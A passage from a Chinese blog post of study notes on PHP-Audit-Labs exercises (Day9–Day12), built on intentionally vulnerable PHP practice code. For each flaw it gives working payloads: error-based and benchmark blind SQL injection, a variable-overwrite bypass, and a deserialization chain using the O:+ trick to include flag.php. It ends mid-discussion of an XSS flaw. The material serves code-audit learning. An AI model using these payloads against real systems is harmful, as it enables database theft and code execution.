alt><br>一个比较明显的过滤函数问题。它只是将<code>../</code>替换为空。那么很容易就能使用<code>....//</code>进行双写绕过<br>然后就是<code>require_once()</code>的文件包含了。</p><p>CMS实例就是造成路径穿越,得到任意文件读取。<br>当然双写/url二次编码进行路径穿越的技巧其实也算很常见了。</p><h3 id="练习-8"><a href="#练习-8" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">/ index.php</span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'function.php'</span>;</span><br><span class="line"></span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername,$username,$password,$dbname);</span><br><span class="line"><span class="keyword">if</span>($conn-&gt;connect_error)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'连接数据库失败'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$sql = <span class="string">"SELECT COUNT(*) FROM users"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    $row = $result-&gt;fetch_assoc();</span><br><span class="line">    $id = $row[<span class="string">'COUNT(*)'</span>] + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'msg'</span>]) &amp;&amp; $_POST[<span class="string">'msg'</span>] !==<span class="string">''</span>)&#123;</span><br><span class="line">    $msg = addslashes($_POST[<span class="string">'msg'</span>]);</span><br><span class="line">    $msg = replace_bad_word(convert($msg));</span><br><span class="line">    $sql = <span class="string">"INSERT INTO users VALUES($id,'"</span>.$msg.<span class="string">"')"</span>;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($conn-&gt;error) <span class="keyword">die</span>($conn-&gt;error);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;h1&gt;Welcome come to HRSEC message board&lt;/center&gt;&lt;/h1&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;center&gt;</span></span><br><span class="line"><span class="string">    &lt;form action="index.php" method="post"&gt;</span></span><br><span class="line"><span class="string">        &lt;p&gt;Leave a message: &lt;input type="text" name="msg" /&gt;&lt;input type="submit" value="Submit" /&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string">    &lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">$sql = <span class="string">"SELECT * FROM users"</span>;</span><br><span class="line">$result = $conn-&gt;query($sql);</span><br><span class="line"><span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;center&gt;&lt;table border='1'&gt;&lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;message&lt;/th&gt;&lt;tr&gt;&lt;/center&gt;"</span>;</span><br><span class="line">    <span class="keyword">while</span>($row = $result-&gt;fetch_row())&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;th&gt;$row[0]&lt;/th&gt;&lt;th&gt;$row[1]&lt;/th&gt;&lt;tr&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;/table&gt;&lt;/center&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">$conn-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// function.php</span></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replace_bad_word</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $limit_words;</span><br><span class="line">    <span class="keyword">foreach</span> ($limit_words <span class="keyword">as</span> $old =&gt; $new) &#123;</span><br><span class="line">        strlen($old) &gt; <span class="number">2</span> &amp;&amp; $str = str_replace($old,trim($new),$str);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">convert</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> htmlentities($str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$limit_words = <span class="keyword">array</span>(<span class="string">'造反'</span> =&gt; <span class="string">'造**'</span>, <span class="string">'法轮功'</span> =&gt; <span class="string">'法**'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>) <span class="keyword">as</span> $method) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($$method <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        $$key = $value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>// config.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$servername = <span class="string">"localhost"</span>;</span><br><span class="line">$username = <span class="string">"hongrisec"</span>;</span><br><span class="line">$password = <span class="string">"hongrisec"</span>;</span><br><span class="line">$dbname = <span class="string">"day9"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 搭建CTF环境使用的sql语句</span></span><br><span class="line">create database day9;</span><br><span class="line"><span class="keyword">use</span> <span class="title">day9</span>;</span><br><span class="line">create table users(</span><br><span class="line">id integer auto_increment not <span class="keyword">null</span> primary key,</span><br><span class="line">message varchar(<span class="number">50</span>)</span><br><span class="line">);</span><br><span class="line">create table flag( flag varchar(<span class="number">40</span>));</span><br><span class="line">insert into flag values(<span class="string">'HRCTF&#123;StR_R3p1ac3_anD_sQ1_inJ3ctIon_zZz&#125;'</span>);</span><br></pre></td></tr></table></figure><p>可控的msg变量被拼接进sql语句。但是却经过了html实体编码,转义,过滤个别词的操作。</p><p>不过,在function.php却存在很明显的变量覆盖漏洞。那么我们可以通过覆盖<code>$limit_words</code>数组，来逃逸单引号.</p><p>最后payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1%00&#39; and updatexml(1,concat(0x7e,(select flag from flag),0x7e),1))#&amp;limit_words[\0\]&#x3D;</span><br><span class="line">1%00&#39; and updatexml(1,concat(0x7e,(select reverse(flag) from flag),0x7e),1))#&amp;limit_words[\0\]&#x3D;</span><br></pre></td></tr></table></figure><h2 id="Day10"><a href="#Day10" class="headerlink" title="Day10"></a>Day10</h2><h3 id="程序判错未exit"><a href="#程序判错未exit" class="headerlink" title="程序判错未exit()"></a>程序判错未exit()</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/11.png" alt></p><p>这里的问题主要是:代码虽然有相应的防御操作，但是程序未立即停止退出，导致程序继续执行的问题</p><p>此处<code>extract()</code>得到了一个变量覆盖的利用<br>加上<code>assert()</code>，所以pi变量直接给webshell代码即可</p><p>我个人一次体验比较深的经历是:在htb的某个靶机中。有一处php代码中曾经限定只有指定用户访问(检查session),才会显示其ssh密钥。而此时我们的权限是www-data.看似无法获得ssh密钥,但是其代码中出现了疏忽,在对user的session判别后没有立即<code>exit()</code>.那么当我们以www-data直接本地curl这一网页时,将可以得到密钥,进而提权。</p><h3 id="练习-9"><a href="#练习-9" class="headerlink" title="练习"></a>练习</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stophack</span><span class="params">($string)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(is_array($string))&#123;</span><br><span class="line">        <span class="keyword">foreach</span>($string <span class="keyword">as</span> $key =&gt; $val) &#123;</span><br><span class="line">            $string[$key] = stophack($val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        $raw = $string;</span><br><span class="line">        $replace = <span class="keyword">array</span>(<span class="string">"\\"</span>,<span class="string">"\""</span>,<span class="string">"'"</span>,<span class="string">"/"</span>,<span class="string">"*"</span>,<span class="string">"%5C"</span>,<span class="string">"%22"</span>,<span class="string">"%27"</span>,<span class="string">"%2A"</span>,<span class="string">"~"</span>,<span class="string">"insert"</span>,<span class="string">"update"</span>,<span class="string">"delete"</span>,<span class="string">"into"</span>,<span class="string">"load_file"</span>,<span class="string">"outfile"</span>,<span class="string">"sleep"</span>,);</span><br><span class="line">        $string = str_ireplace($replace, <span class="string">"HongRi"</span>, $string);</span><br><span class="line">        $string = strip_tags($string);</span><br><span class="line">        <span class="keyword">if</span>($raw!=$string)&#123;</span><br><span class="line">            error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">            header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> trim($string);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$conn = <span class="keyword">new</span> mysqli($servername, $username, $password, $dbname);</span><br><span class="line"><span class="keyword">if</span> ($conn-&gt;connect_error) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"连接失败: "</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]) &amp;&amp; $_GET[<span class="string">'id'</span>])&#123;</span><br><span class="line">    $id = stophack($_GET[<span class="string">'id'</span>]);</span><br><span class="line">    $sql = <span class="string">"SELECT * FROM students WHERE id=$id"</span>;</span><br><span class="line">    $result = $conn-&gt;query($sql);</span><br><span class="line">    <span class="keyword">if</span>($result-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        $row = $result-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;h1&gt;查询结果为：&lt;/h1&gt;&lt;pre&gt;'</span>.<span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        | id | name    | email              | score |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+</span></span><br><span class="line"><span class="string">        |  <span class="subst">&#123;$row['id']&#125;</span> | <span class="subst">&#123;$row['name']&#125;</span>   | <span class="subst">&#123;$row['email']&#125;</span>   |   <span class="subst">&#123;$row['score']&#125;</span> |</span></span><br><span class="line"><span class="string">        +----+---------+--------------------+-------+&lt;/center&gt;</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">"你所查询的对象id值不能为空！"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>显然,程序如果检测到非法字符或单词，都会将其替换成字符串 HongRi ，然而并没有立即退出，这样攻击者输入的攻击语句还是会继续被带入数据库查询。只不过这里关键词都被替换成了字符串 HongRi</p><p>简单的使用benchmark替换sleep即可盲注</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 or if(ascii(mid((select flag from flag),1,1))&#x3D;115,benchmark(200000000,7^3^8),0)</span><br></pre></td></tr></table></figure><h2 id="Day11"><a href="#Day11" class="headerlink" title="Day11"></a>Day11</h2><h3 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/12.png" alt><br>(第11行正则表达式应改为：’/O:\d:/‘)</p><p>首先确认了存在反序列化。且数据是cookie可控。那么考虑下绕过执行反序列化。</p><p>那么看下loaddata里的限制<br>开头不能是<code>O:</code>,即反序列化内容不为对象<br>同时需要不能匹配字符串为<code>O:任意十进制:</code><br>如果只是第一部分当然可以使用数组绕过。但是这样第二部分还是会匹配到数组中的对象成分。</p><p>这里用到的是一个比较老的绕过方法了。即使用<code>O:+</code>绕过。而原理可以涉及到底层源码。函数遇到<code>+</code>号时会继续向下判断，因此可以正常反序列化。</p><p>最后就能成功执行写文件webshell了。</p><h3 id="练习-10"><a href="#练习-10" class="headerlink" title="练习"></a>练习</h3> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">"config.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HITCON</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $method;</span><br><span class="line">    <span class="keyword">public</span> $args;</span><br><span class="line">    <span class="keyword">public</span> $conn;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($method, $args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;method = $method;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;args = $args;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__conn</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> $db_host, $db_name, $db_user, $db_pass, $DEBUG;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;conn)</span><br><span class="line">            <span class="keyword">$this</span>-&gt;conn = mysql_connect($db_host, $db_user, $db_pass);</span><br><span class="line">        mysql_select_db($db_name, <span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">        <span class="keyword">if</span> ($DEBUG) &#123;</span><br><span class="line">            $sql = <span class="string">"DROP TABLE IF  EXISTS  users"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"CREATE TABLE IF NOT EXISTS users (username VARCHAR(64),</span></span><br><span class="line"><span class="string">            password VARCHAR(64),role VARCHAR(256)) CHARACTER SET utf8"</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">            $sql = <span class="string">"INSERT INTO users VALUES ('orange', '$db_pass', 'admin'), ('phddaa', 'ddaa', 'user')"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__query($sql, $back=<span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        mysql_query(<span class="string">"SET names utf8"</span>);</span><br><span class="line">        mysql_query(<span class="string">"SET sql_mode = 'strict_all_tables'"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__query</span><span class="params">($sql, $back=true)</span> </span>&#123;</span><br><span class="line">        $result = @mysql_query($sql);</span><br><span class="line">        <span class="keyword">if</span> ($back) &#123;</span><br><span class="line">            <span class="keyword">return</span> @mysql_fetch_object($result);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($username, $password) = func_get_args();</span><br><span class="line">        $sql = sprintf(<span class="string">"SELECT * FROM users WHERE username='%s' AND password='%s'"</span>, $username, md5($password));</span><br><span class="line">        $obj = <span class="keyword">$this</span>-&gt;__query($sql);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( $obj != <span class="keyword">false</span> ) &#123;</span><br><span class="line">            define(<span class="string">'IN_FLAG'</span>, <span class="keyword">TRUE</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;loadData($obj-&gt;role);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;__die(<span class="string">"sorry!"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span> &amp;&amp; !preg_match(<span class="string">'/O:\d:/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__die</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">        header(<span class="string">"Content-Type: application/json"</span>);</span><br><span class="line">        <span class="keyword">die</span>( json_encode( <span class="keyword">array</span>(<span class="string">"msg"</span>=&gt; $msg) ) );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__close</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mysql_close(<span class="keyword">$this</span>-&gt;conn);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">source</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__conn();</span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="keyword">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">"login"</span>, <span class="string">"source"</span>))) &#123;</span><br><span class="line">            @call_user_func_array(<span class="keyword">array</span>(<span class="keyword">$this</span>, <span class="keyword">$this</span>-&gt;method), <span class="keyword">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;__die(<span class="string">"What do you do?"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;args <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;args[$k] = strtolower(trim(mysql_escape_string($v)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SoFun</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file=<span class="string">'index.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file)) &#123;</span><br><span class="line">            <span class="keyword">include</span> <span class="keyword">$this</span>-&gt;file;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt; file=<span class="string">'index.php'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">"data"</span>])) &#123;</span><br><span class="line">    @unserialize($_GET[<span class="string">"data"</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">new</span> HITCON(<span class="string">"source"</span>, <span class="keyword">array</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//config.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $db_host = <span class="string">'localhost'</span>;</span><br><span class="line">    $db_name = <span class="string">'test'</span>;</span><br><span class="line">    $db_user = <span class="string">'root'</span>;</span><br><span class="line">    $db_pass = <span class="string">'123'</span>;</span><br><span class="line">$DEBUG = <span class="string">'xx'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">!defined(<span class="string">'IN_FLAG'</span>) &amp;&amp; <span class="keyword">exit</span>(<span class="string">'Access Denied'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag&#123;un3eri@liz3_i3_s0_fun&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先从简单的看起,首先是SoFun类。显然绕过wakeup即可include可控数据flag.php。但是需要注意flag.php限制了必须<code>defined(&#39;IN_FLAG&#39;)</code>。</p><p>注意到HITCON类则有一个跟前面例子一样的loaddata。那就可以用相同方法绕过执行反序列化。</p><p>HITCON类login方法显然存在sql注入,且loaddata就是在这里被调用的。那么我们需要让loaddata传入的数据为SoFun类的文件包含序列化数据。<br>而这一数据来自<code>$obj-&gt;role</code>.</p><p><code>$obj</code>是sql语句的返回结果。而sql表结构中第三个字段role正是我们需要的。那么只要利用这个sql注入进行union查询就达成<code>$obj-&gt;role</code>可控。</p><p>由于析构函数中可以控制我们调用的方法及参数。所以以上思路可以执行。</p><p>最后注意的是。HITCON类的wakeup会对sql语句进行转义。所以我们用同样的方法绕过wakeup即可</p><p><code>O:6:&quot;HITCON&quot;:3:{s:6:&quot;method&quot;;s:5:&quot;login&quot;;s:4:&quot;args&quot;;a:2:{s:8:&quot;username&quot;;s:81:&quot;1&#39; union select 1,2,&#39;a:1:{s:2:&quot;xx&quot;;O:%2b5:&quot;SoFun&quot;:2:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}}&#39;%23&quot;;s:8:&quot;password&quot;;s:3:&quot;234&quot;;}}</code></p><h2 id="Day12"><a href="#Day12" class="headerlink" title="Day12"></a>Day12</h2><h3 id="htmlentities-处理不全"><a href="#htmlentities-处理不全" class="headerlink" title="htmlentities()处理不全"></a>htmlentities()处理不全</h3><p><img src="/2020/04/27/PHP-Audit-Labs%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/13.png" alt><br>这里的代码存在一个xss攻击.<br>输出点在一个a标签。同时输出时经过了一次htmlentities.不过这个函数<code>htmlentities()</code>并不能转换所有的特殊字符，是转换除了空格之外的特殊字符，且单引号和双引号需要单独控制<br>此处默认值的话是不会转义单引号的。<br>同时前面在变量覆盖时传入的变量只对<code>$value</code> 进行类型转换，强制变成int类型。但是这部分代码只处理了 <code>$value</code> 变量，没针对 <code>$key</code> 